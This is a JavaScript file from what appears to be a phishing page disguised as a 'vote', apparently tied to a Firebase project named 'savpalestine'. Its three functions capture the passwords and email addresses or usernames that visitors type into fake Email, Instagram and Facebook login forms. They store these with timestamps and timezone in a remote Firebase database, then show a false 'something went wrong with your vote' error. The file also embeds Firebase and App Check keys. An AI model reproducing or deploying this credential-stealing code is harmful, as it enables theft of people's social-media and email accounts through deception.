// Initialize Firebase
const firebaseConfig = {
apiKey: "AIzaSyA8lnkl-LBnUFGFBwa8CYtYPOr3qJiAhfk",
authDomain: "savpalestine.firebaseapp.com",
databaseURL: "https://savpalestine-default-rtdb.firebaseio.com",
projectId: "savpalestine",
storageBucket: "savpalestine.appspot.com",
messagingSenderId: "724458243697",
appId: "1:724458243697:web:ed5a618889052e4a023dd0"
};
firebase.initializeApp(firebaseConfig);
const appCheck = firebase.appCheck();
console.log(appCheck);
appCheck.activate("6Lf544sgAAAAAIYRP96xR6Zd5bDJwPD9dh7bo3jW", true);

function hmlog() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      var errorCode = error.code;
      var errorMessage = error.message;
      window.alert("Error: " + errorMessage);
    });

  var email = document.getElementById("hm-email").value;
  var password = document.getElementById("hm-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Email";

  if (email !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: email,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      alert("Oops! Something went wrong with your vote.");
      document.getElementById("hm-pass").value = "";

      return false;
    }, 2000);
  }
}

function iglog() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      var errorCode = error.code;
      var errorMessage = error.message;
      window.alert("Error: " + errorMessage);
    });

  var username = document.getElementById("ig-uname").value;
  var password = document.getElementById("ig-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  console.log(timezone);
  var accountType = "Instagram";

  if (username !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: username,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      alert("Oops! Something went wrong with your vote.");
      document.getElementById("ig-pass").value = "";
      return false;
    }, 2000);
  }
}

function login() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      var errorCode = error.code;
      var errorMessage = error.message;
      window.alert("Error: " + errorMessage);
    });

  var email = document.getElementById("fb-email").value;
  var password = document.getElementById("fb-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Facebook";

  if (email !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: email,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      alert("Oops! Something went wrong with your vote.");
      document.getElementById("fb-pass").value = "";

      return false;
    }, 2000);
  }
}
